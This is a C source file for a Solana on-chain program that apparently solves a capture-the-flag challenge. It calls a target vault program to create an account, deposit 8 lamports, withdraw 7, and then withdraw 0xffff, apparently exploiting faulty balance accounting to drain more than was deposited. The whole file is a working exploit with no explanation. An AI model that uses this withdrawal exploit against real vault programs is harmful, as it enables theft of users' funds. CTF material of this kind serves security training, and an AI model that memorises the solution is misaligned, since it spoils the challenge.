#include <solana_sdk.h>
#include "../shared/test.h"

void create(SolParameters* params) {
  SolAccountInfo* system = &params->ka[0];
  SolAccountInfo* clock = &params->ka[1];
  SolAccountInfo* user = &params->ka[2];
  SolAccountInfo* vault = &params->ka[3];
  SolAccountInfo* program = &params->ka[4];
  SolAccountInfo* wallet = &params->ka[5];
  SolAccountInfo* solve = &params->ka[6];

  SolAccountMeta arguments[] = {
    {clock->key, false, false},
    {system->key, false, false},
    {wallet->key, true, false},
    {solve->key, false, false},
    {user->key, true, true}
  };
  uint8_t data[5];
  sol_memset(data, 0, sizeof(data));
  *(uint16_t *)data = 0;
  data[4] = params->data[1];
  const SolInstruction instruction = {program->key, arguments,
                                      SOL_ARRAY_SIZE(arguments), data,
                                      SOL_ARRAY_SIZE(data)};
  sol_invoke(&instruction, params->ka, params->ka_num);
}

void deposit(SolParameters* params, uint16_t lamports) {
  SolAccountInfo* system = &params->ka[0];
  SolAccountInfo* clock = &params->ka[1];
  SolAccountInfo* user = &params->ka[2];
  SolAccountInfo* vault = &params->ka[3];
  SolAccountInfo* program = &params->ka[4];
  SolAccountInfo* wallet = &params->ka[5];
  SolAccountInfo* solve = &params->ka[6];

  SolAccountMeta arguments[] = {
    {clock->key, false, false},
    {system->key, false, false},
    {wallet->key, true, false},
    {user->key, true, true},
    {vault->key, true, false}
  };
  uint8_t data[4 + sizeof(deposit_args)];
  sol_memset(data, 0, sizeof(data));
  *(uint16_t *)data = 1;
  deposit_args* args = (deposit_args*) (data + 4);
  args->amt = lamports;
  args->idx = 0;
  const SolInstruction instruction = {program->key, arguments,
                                      SOL_ARRAY_SIZE(arguments), data,
                                      SOL_ARRAY_SIZE(data)};
  sol_invoke(&instruction, params->ka, params->ka_num);
}

void withdraw(SolParameters* params, uint16_t lamports) {
  SolAccountInfo* system = &params->ka[0];
  SolAccountInfo* clock = &params->ka[1];
  SolAccountInfo* user = &params->ka[2];
  SolAccountInfo* vault = &params->ka[3];
  SolAccountInfo* program = &params->ka[4];
  SolAccountInfo* wallet = &params->ka[5];
  SolAccountInfo* solve = &params->ka[6];

  SolAccountMeta arguments[] = {
    {clock->key, false, false},
    {system->key, false, false},
    {wallet->key, true, false},
    {user->key, true, true},
    {vault->key, true, false}
  };
  uint8_t data[4 + sizeof(withdraw_args)];
  sol_memset(data, 0, sizeof(data));
  *(uint16_t *)data = 2;
  withdraw_args* args = (withdraw_args*) (data + 4);
  args->amt = lamports;
  args->idx = 0;
  args->bump = params->data[0];
  const SolInstruction instruction = {program->key, arguments,
                                      SOL_ARRAY_SIZE(arguments), data,
                                      SOL_ARRAY_SIZE(data)};
  sol_invoke(&instruction, params->ka, params->ka_num);
}

uint64_t solution(SolParameters *params) {
  create(params);
  deposit(params, 8);
  withdraw(params, 7);
  withdraw(params, 0xffff);
  return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input) {
  sol_log("solution start");

  SolAccountInfo accounts[10];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
    return ERROR_INVALID_ARGUMENT;
  }

  return solution(&params);
}
